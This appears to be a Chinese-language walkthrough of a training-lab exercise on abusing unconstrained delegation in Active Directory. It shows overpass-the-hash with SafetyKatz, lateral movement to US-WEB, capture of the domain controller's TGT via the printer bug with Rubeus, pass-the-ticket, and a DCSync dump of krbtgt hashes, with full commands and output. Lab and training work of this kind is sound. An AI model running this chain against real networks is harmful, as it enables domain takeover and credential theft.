Task
•  Find a server in US domain where Unconstrained Delegation is enabled.
•  Compromise that server and get Domain Admin privileges.

# Find a server in US domain where Unconstrained Delegation is enabled.

使用 Active Directory module枚举无约束委派机器

```
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\ad\Tools> Get-ADComputer -Filter {TrustedForDelegation -eq $True}


DistinguishedName : CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=local
DNSHostName       : US-DC.us.techcorp.local
Enabled           : True
Name              : US-DC
ObjectClass       : computer
ObjectGUID        : 2edf59cf-aa6e-448a-9810-7a81a3d3af16
SamAccountName    : US-DC$
SID               : S-1-5-21-210670787-2521448726-163245708-1000
UserPrincipalName :

DistinguishedName : CN=US-WEB,CN=Computers,DC=us,DC=techcorp,DC=local
DNSHostName       : US-Web.us.techcorp.local
Enabled           : True
Name              : US-WEB
ObjectClass       : computer
ObjectGUID        : cb00dc1e-3619-4187-a02b-42f9c964a637
SamAccountName    : US-WEB$
SID               : S-1-5-21-210670787-2521448726-163245708-1110
UserPrincipalName :
```
US-DC是DC，常规无约束委派，不理会

US-WEB就是我们下一个需要拿下的机器



# Compromise that server and get Domain Admin privileges.

在上一节，我们拿到了webmaster的哈希，这里使用这个账号看是否对US-WEB有管理员权限
```
Authentication Id : 0 ; 5845902 (00000000:0059338e)
Session           : Service from 0
User Name         : webmaster
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 4:13:57 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1140

         * Username : webmaster
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
           rc4_md4           23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f
```


使用 OverPass-The-Hash

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:cmd.exe" "exit"
```

在上面操作新生成的shell下,使用Find-PSRemotingLocalAdminAccess.ps1查看当前账号有admin权限的机器
```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>set COR_ENABLE_PROFILING=1
...
...

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Verbose
VERBOSE: Trying to run a command parallely on provided computers list using PSRemoting .
US-Web
```

对US-Web有管理员权限


## printer bug

对无约束委派机器获取DC的一个常规方法是printer bug

1. 把 Rubeus.exe拷贝到无约束委派机器US-Web，在OverPass-The-Hash生成的shell下操作
```
echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
```

2. 横向到us-web

```
PS C:\Windows\system32> winrs -r:us-web cmd.exe
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>
```

3. 执行monitor监控DC过来的流量认证
```
C:\Users\webmaster>C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: TGT Monitoring
[*] Target user     : US-DC$
[*] Monitoring every 5 seconds for new TGTs
```

4. 在学生机器，使用MS-RPRN.exe，强制DC向us-web认证

```
C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```


5. monitor收到DC的tgt

```
C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: TGT Monitoring
[*] Target user     : US-DC$
[*] Monitoring every 5 seconds for new TGTs


[*] 11/2/2022 12:50:06 AM UTC - Found new TGT:

  User                  :  US-DC$@US.TECHCORP.LOCAL
  StartTime             :  11/1/2022 2:03:50 PM
  EndTime               :  11/2/2022 12:03:13 AM
  RenewTill             :  11/8/2022 1:03:13 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMtKENnj0+qIixDRD2D/3dWGzYPIgMsMkpFZGK1X/d2d8ftCsmm3kzB13NEjzULmCWSJtFkzRGL3KGYVb4uxCnOShO3bj/CxZZZzm8ou85TNvvZl8LGv7pK1vfu9DkmKQ6A1XrfpR0kas0JWCHRtBceDRIaXwPub5GElZAsAZIZDR/g05gD2mfNQzknMfahUgwqQyuwHHiGgsnE5XAyJjrILGp263RbNxf3/fm4NXI6tP+3wUZmC91Ea0ZAHlGWuxUFNuUliSTyq0JqSLqXc6KGyeVX1MJsQ6CbKaVxlE8HOLObkDEFJI7xe0mBjQLHxm5WP+nBcxaE2ONG0GOEEj+3505H5ezIFi1nd1vcBbw9P2CjnusujyF3JRATAX4ojRUveoO0HYtzjcuIoVbwgozl3e/ien2LK2sK4tjjAP8j+Q4wufsxnftx9ycp0TcajhygubV6b2pkGiqMvgXWOiOzViKG8yR/Ds0IdA7tBSX/fbpU2TL8pip/F/0ENwcCKnt6sF8SrGlXUnAl7uy+JPQbLhxksOE+fpw9A8lRFoNZyghVuzSEnmkIWBYL1MKfKbmEOvULQL+ftTRS+s2dIeNoZicpjMp5DDdvpThfhA0iWmCtLPD/1nyZtfBp8OGm8dCAzqjkCS0/JNCIM3nFNd8DoKZ3lsCGuFcyO+4a20fzUdA3gXK0bzW83Z6cN1uV2ZakUv8lnqVaY7zplBTk+lNO0/zmhZRlTX1EME7cBXS6laPosaGdUw51QYlnMzlg4hKQ6YtQNRgLQRaa+6A0mbsEph3NY8wCL5hV8O0IwMDkmZWbRr4iLBN3EB2itji3WE7O89GP8XbiM/tbF8CK/Mil5qXzTJKEWEc5sTQofrLOpy8Gqnz4NS+UpMwR89pF3TscFr1SteqTNAU4ydQiQWWSew8gV/APDm7n/ak/AI3At5Cyn/cqyXxDs0d0WrOUWfMB7Iuq6WP66E4Wqm1Otv6HBCgZaP/vkU08aM0KmVfJP3pKvZr0OPOqv8pliVWaflMf+9zcwqeyAJt87yqFBV24JBZAHeUmPMOV12qCMYt7wUEdGhGq4X2A/HeqwVyKSQlTJ3bFlBMryto4OoeaO0sOTEzmdpQzwtjxRtQnEn/lodoEhUmdtFEGlC6Pb5v/OUhGIGYF6twCBEX7h/HBOVnw3e9bJQmMp5zexNZ8hiqk/ErOFzwSzKQ5orDdJI2IISaJNmKogEjLdLADoHukmiFNrG9lghn/jqbljPWjBUZCxUlQWd7Y/b8vrWC2bm1f6LkEiQINyA+UzDzJfwhaciJewFOGOqdemmgvV0a8nmDe5FUT9bdPk1O/YLotupI8pPtAE/CoKpQmZMnV72NKu3+ng8E26OV1vKMPtogvG3vjhHi9N1aGNsxJM63jyFaatnJwoxDlf7dgPxM1Un5UkNhKuGI7gCHl6ark8C5IjinWpCfj1lLLX/rvg+ETTijgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCAWbCiTtFWnXq2T8q4KI6mzZjxzJHePGJ9I17rtN6Epj6ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIyMTEwMTIxMDM1MFqmERgPMjAyMjExMDIwNzAzMTNapxEYDzIwMjIxMTA4MjEwMzEzWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=

[*] Ticket cache size: 1
```


6. 使用上面接收到的tgt，ptt

```
PS C:\ad\Tools> C:\AD\Tools\Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMtKENnj0+qIixDRD2D/3dWGzYPIgMsMkpFZGK1X/d2d8ftCsmm3kzB13NEjzULmCWSJtFkzRGL3KGYVb4uxCnOShO3bj/CxZZZzm8ou85TNvvZl8LGv7pK1vfu9DkmKQ6A1XrfpR0kas0JWCHRtBceDRIaXwPub5GElZAsAZIZDR/g05gD2mfNQzknMfahUgwqQyuwHHiGgsnE5XAyJjrILGp263RbNxf3/fm4NXI6tP+3wUZmC91Ea0ZAHlGWuxUFNuUliSTyq0JqSLqXc6KGyeVX1MJsQ6CbKaVxlE8HOLObkDEFJI7xe0mBjQLHxm5WP+nBcxaE2ONG0GOEEj+3505H5ezIFi1nd1vcBbw9P2CjnusujyF3JRATAX4ojRUveoO0HYtzjcuIoVbwgozl3e/ien2LK2sK4tjjAP8j+Q4wufsxnftx9ycp0TcajhygubV6b2pkGiqMvgXWOiOzViKG8yR/Ds0IdA7tBSX/fbpU2TL8pip/F/0ENwcCKnt6sF8SrGlXUnAl7uy+JPQbLhxksOE+fpw9A8lRFoNZyghVuzSEnmkIWBYL1MKfKbmEOvULQL+ftTRS+s2dIeNoZicpjMp5DDdvpThfhA0iWmCtLPD/1nyZtfBp8OGm8dCAzqjkCS0/JNCIM3nFNd8DoKZ3lsCGuFcyO+4a20fzUdA3gXK0bzW83Z6cN1uV2ZakUv8lnqVaY7zplBTk+lNO0/zmhZRlTX1EME7cBXS6laPosaGdUw51QYlnMzlg4hKQ6YtQNRgLQRaa+6A0mbsEph3NY8wCL5hV8O0IwMDkmZWbRr4iLBN3EB2itji3WE7O89GP8XbiM/tbF8CK/Mil5qXzTJKEWEc5sTQofrLOpy8Gqnz4NS+UpMwR89pF3TscFr1SteqTNAU4ydQiQWWSew8gV/APDm7n/ak/AI3At5Cyn/cqyXxDs0d0WrOUWfMB7Iuq6WP66E4Wqm1Otv6HBCgZaP/vkU08aM0KmVfJP3pKvZr0OPOqv8pliVWaflMf+9zcwqeyAJt87yqFBV24JBZAHeUmPMOV12qCMYt7wUEdGhGq4X2A/HeqwVyKSQlTJ3bFlBMryto4OoeaO0sOTEzmdpQzwtjxRtQnEn/lodoEhUmdtFEGlC6Pb5v/OUhGIGYF6twCBEX7h/HBOVnw3e9bJQmMp5zexNZ8hiqk/ErOFzwSzKQ5orDdJI2IISaJNmKogEjLdLADoHukmiFNrG9lghn/jqbljPWjBUZCxUlQWd7Y/b8vrWC2bm1f6LkEiQINyA+UzDzJfwhaciJewFOGOqdemmgvV0a8nmDe5FUT9bdPk1O/YLotupI8pPtAE/CoKpQmZMnV72NKu3+ng8E26OV1vKMPtogvG3vjhHi9N1aGNsxJM63jyFaatnJwoxDlf7dgPxM1Un5UkNhKuGI7gCHl6ark8C5IjinWpCfj1lLLX/rvg+ETTijgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCAWbCiTtFWnXq2T8q4KI6mzZjxzJHePGJ9I17rtN6Epj6ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIyMTEwMTIxMDM1MFqmERgPMjAyMjExMDIwNzAzMTNapxEYDzIwMjIxMTA4MjEwMzEzWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

7. 现在我们可以使用DCsync导出krbtgt的哈希

```
PS C:\ad\Tools> C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] us.techcorp.local will be the domain
[!] us-dc.us.techcorp.local will be the DC server
[!] us\krbtgt will be the user account
[*]
[*] Object RDN           : krbtgt
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : krbtgt
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/5/2019 12:49:17 AM
[*] Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
[*] Object Relative ID   : 502
[*]
[*] Credents:
[*] Hash NTLM            : b0975ae49f441adc6b024ad238935af5
[*] ntlm- 0              : b0975ae49f441adc6b024ad238935af5
[*] lm  - 0              : d765cfb668ed3b1f510b8c3861447173
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : 819a7c8674e0302cbeec32f3f7b226c9
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
[*]     Credents
[*]     aes256_hmac       4096: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
[*]     aes128_hmac       4096: 1bae2a6639bb33bf720e2d50807bf2c1
[*]     des_cbc_md5       4096: 923158b519f7a454
[*]     ServiceCredents
[*]     OldCredents
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
[*]     Credents
[*]     des_cbc_md5       : 923158b519f7a454
[*]     OldCredents
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 a1bdf6146e4b13c939093eb2d72416c9
[*]     02 cd864c0d5369adad4fc59a469a2d4d17
[*]     03 2123179b0ab5c0e37943e346ef1f9d9a
[*]     04 a1bdf6146e4b13c939093eb2d72416c9
[*]     05 cd864c0d5369adad4fc59a469a2d4d17
[*]     06 3449e5615d5a09bbc2802cefa8e4f9d4
[*]     07 a1bdf6146e4b13c939093eb2d72416c9
[*]     08 296114c8d353f7435b5c3ac112523ba4
[*]     09 296114c8d353f7435b5c3ac112523ba4
[*]     10 5d504fb94f1bcca78bd048de9dad69e4
[*]     11 142c7fde1e3cb590f54e12bbfdecfbe4
[*]     12 296114c8d353f7435b5c3ac112523ba4
[*]     13 13db8df6b262a6013f78b082a72add2c
[*]     14 142c7fde1e3cb590f54e12bbfdecfbe4
[*]     15 b024bdda9bdb86af00c3b2503c3bf620
[*]     16 b024bdda9bdb86af00c3b2503c3bf620
[*]     17 91600843c8dadc79e72a753649a05d75
[*]     18 423730024cfbbc450961f67008a128a5
[*]     19 d71f700d63fa4510477342b9dc3f3cc7
[*]     20 bad6b9122f71f8cfd7ea556374d381d9
[*]     21 52c6560f77613d0dcf460476da445d93
[*]     22 52c6560f77613d0dcf460476da445d93
[*]     23 23504d9f1325c5cf68892348f26e77d7
[*]     24 8228bd623c788b638fce1368c6b3ef44
[*]     25 8228bd623c788b638fce1368c6b3ef44
[*]     26 a2659c1d9fa797075b1fabdee926569b
[*]     27 784f5fbc5276dcc8f88bbcdfa27b65d8
[*]     28 2ac6c7c1c24262b424f85e1ab762f1d3
[*]     29 4bef285b22fd87f4868be352958dcb9e
```